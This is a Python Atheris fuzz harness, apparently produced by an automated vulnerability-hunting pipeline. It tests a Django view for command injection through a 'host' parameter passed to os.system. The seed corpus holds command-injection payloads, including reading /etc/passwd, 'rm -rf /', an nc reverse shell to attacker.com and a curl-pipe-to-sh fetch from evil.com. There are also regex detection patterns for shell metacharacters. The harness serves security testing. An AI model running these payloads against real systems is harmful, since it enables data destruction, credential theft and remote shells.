import atheris
import sys
import re
import os

from unittest.mock import patch, MagicMock



REPO_ROOT = "/home/trieudai/VulnHunterX/repos/python/vc-codex-high-seeded-v2-crm-saas-django"
if REPO_ROOT and REPO_ROOT not in sys.path:
    sys.path.insert(0, REPO_ROOT)

import django
os.environ.setdefault("DJANGO_SETTINGS_MODULE", "config.settings")
django.setup()

with atheris.instrument_imports():

    from config.partner_console import acct_shell_probe_633


# === FIXED CONTRACTS (DO NOT MODIFY) ===
_COMPILED_PATTERNS = [

    re.compile("ping -c 1 [^ ;|&$`\n]*[;|&$`]", re.IGNORECASE),

    re.compile("ping -c 1 [^ ;|&$`\n]*\\$\\(", re.IGNORECASE),

    re.compile("ping -c 1 [^ ;|&$`\n]*`[^`]+`", re.IGNORECASE),

]
_RAISE_MESSAGE  = "PY_COMMAND-LINE-INJECTION: command injection detected in _os.system argument — captured={captured} pattern={matched_pattern}"
_TAINTED_PARAMS = [{"name": "request", "index": 0, "type": "django.http.HttpRequest"}]
# ========================================

# === ORACLE CONTEXT ===
# strategy         : recorded_call
# patch_target     : config.partner_console._os.system
# target_arg_index : 0
# target_arg_name  : None
# input_strategy   : direct_params
# signature        : def acct_shell_probe_633(request)
# condition        : The captured command string contains shell metacharacters (;, |, &, $, backticks) after the 'ping -c 1 ' prefix, indicating command injection via unsanitized host parameter
# capture_what     : full command string passed to _os.system(), which is 'ping -c 1 ' + user-controlled host value
# skip_hint        : False
# ========================================


# === RECORDED_CALL SKELETON ===
# TODO: Complete TestOneInput following these steps:
# 1. Generate inputs using FuzzedDataProvider.
# 2. Apply skip_hint (if applicable).
# 3. Mock the patch target using patch/MagicMock.
# 4. Call target function inside the mock context.
# 5. Compare mock call arguments against _COMPILED_PATTERNS.
# 6. Propagate RuntimeError; swallow other exceptions.
# ==========================================



def TestOneInput(data):
    fdp = atheris.FuzzedDataProvider(data)
    # NOTE: For string inputs, use fdp.ConsumeBytes(1024).decode('utf-8', errors='ignore')
    #       instead of ConsumeUnicodeNoSurrogates() to preserve raw seed payloads.

    host_val = fdp.ConsumeBytes(1024).decode('utf-8', errors='ignore')

    mock_request = MagicMock()
    mock_request.GET = {'host': host_val}
    mock_request.POST = {'host': host_val}
    mock_request.method = 'GET'
    mock_request.META = {'CONTENT_TYPE': 'application/x-www-form-urlencoded'}
    mock_request.body = b''
    mock_request.session = {}
    mock_request.user = MagicMock()

    with patch('config.partner_console._os.system') as mock_system:
        mock_system.return_value = 0

        try:
            acct_shell_probe_633(mock_request)
        except RuntimeError:
            raise
        except Exception:
            pass

        for call in mock_system.call_args_list:
            captured = None
            if call.args and len(call.args) > 0:
                captured = str(call.args[0])

            if captured is not None:
                for pattern in _COMPILED_PATTERNS:
                    m = pattern.search(captured)
                    if m:
                        raise RuntimeError(_RAISE_MESSAGE.format(captured=captured, matched_pattern=m.group()))



# === SEED CORPUS — bypass-oriented, derived from trigger_patterns ===
# LLM: populate _SEED_CORPUS with entries designed to SURVIVE the filter,
# not just trigger it. Cover: mixed case, whitespace injection, unicode
# homoglyphs, double encoding, tag nesting, attribute abuse.
_SEED_CORPUS = [
    "127.0.0.1;whoami",
    "127.0.0.1|cat /etc/passwd",
    "127.0.0.1&id",
    "127.0.0.1$(whoami)",
    "127.0.0.1`id`",
    "192.168.1.1;rm -rf /",
    "10.0.0.1|nc -e /bin/sh attacker.com 4444",
    "172.16.0.1&curl http://evil.com/shell.sh|sh",
    "127.0.0.1 ; ls -la /",
    "localhost$((1+1))",
    "127.0.0.1`uname -a`",
    "8.8.8.8;&sleep 5",
]


if __name__ == "__main__":
    # Export seed corpus to disk so libFuzzer can mutate raw bytes directly.
    # This preserves coverage-guided mutation — fuzzer mutates content, not index.
    _CORPUS_DIR = "output/python/vc-codex-high-seeded-v2-crm-saas-django/fuzz_corpus/py_command_line_injection_config_partner_console_py_185"
    os.makedirs(_CORPUS_DIR, exist_ok=True)
    for _i, _seed in enumerate(_SEED_CORPUS):
        _seed_path = os.path.join(_CORPUS_DIR, f"seed_{_i:03d}")
        if not os.path.exists(_seed_path):
            with open(_seed_path, "wb") as _f:
                if isinstance(_seed, bytes):
                    _f.write(_seed)
                else:
                    _f.write(_seed.encode("utf-8"))

    if _CORPUS_DIR not in sys.argv:
        sys.argv.append(_CORPUS_DIR)

    atheris.Setup(sys.argv, TestOneInput)
    atheris.Fuzz()